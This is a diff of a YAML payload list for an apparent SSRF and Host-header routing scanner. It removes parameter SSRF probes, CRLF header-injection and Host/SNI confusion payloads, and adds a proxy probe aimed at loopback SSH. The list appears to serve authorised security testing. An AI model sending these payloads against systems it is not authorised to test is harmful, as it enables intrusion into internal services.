@@ -1,34 +1,4 @@
 payloads:
-  - active: false
-    type: param
-    key: url
-    value: "https://%s/"
-    group: standard
-    comment: "Common SSRF parameter"
-  - active: false
-    type: param
-    key: target
-    value: "https://%s/"
-    group: standard
-    comment: "Common SSRF parameter"
-  - active: false
-    type: param
-    key: proxy
-    value: "https://%s/"
-    group: standard
-    comment: "Proxy parameter"
-  - active: false
-    type: param
-    key: src
-    value: "https://%s/"
-    group: standard
-    comment: "Source URL parameter"
-  - active: false
-    type: param
-    key: ref
-    value: "https://%s/"
-    group: standard
-    comment: "Ref parameter"
   - active: true
     type: raw
     key: absolute-url-host-mismatch
@@ -53,51 +23,9 @@ payloads:
     value: "Host: {host}@%s"
     group: cracking_the_lens
     comment: "reverse userinfo confusion"
-  - active: false
-    type: raw
-    key: host-with-hash
-    value: "Host: {host}#%s"
-    group: cracking_the_lens
-    comment: "fragment parser confusion"
-  - active: false
-    type: raw
-    key: host-crlf-inject
-    value: "Host: {host}\\r\\nX-Injected: %s"
-    group: cracking_the_lens
-    comment: "Header injection"
-  - active: false
-    type: raw
-    key: host-with-space
-    value: "Host: {host} %s"
-    group: cracking_the_lens
-    comment: "Space split parser confusion"
-  - active: false
-    type: raw
-    key: path-at-prefix
-    value: "GET @%s{path} HTTP/1.1\\r\\nHost: {host}\\r\\n"
-    group: cracking_the_lens
-    comment: "Path at prefix"
-  - active: false
-    type: raw
-    key: path-slash-prefix
-    value: "GET /%s{path} HTTP/1.1\\r\\nHost: {host}\\r\\n"
-    group: cracking_the_lens
-    comment: "Path slash prefix"
   - active: true
     type: raw
-    key: sni-host-mismatch
-    value: "sni=%s,host={host}"
-    group: cracking_the_lens
-    comment: "SNI to OOB, Host to target"
-  - active: true
-    type: raw
-    key: sni-host-mismatch-reversed
-    value: "sni={host},host=%s"
-    group: cracking_the_lens
-    comment: "SNI to target, Host to OOB"
-  - active: false
-    type: raw
-    key: alt-ports
-    value: "ports=8080,8443,4443,8888,8000,9090,9443"
-    group: cracking_the_lens
-    comment: "Repeat standard payloads on alternate ports"
+    key: proxy-local-ssh
+    value: "response-based proxy SSRF to loopback SSH"
+    group: proxy_unsafe
+    comment: "unsafe proxy behavior to 127.0.0.1:22 and localhost:22"
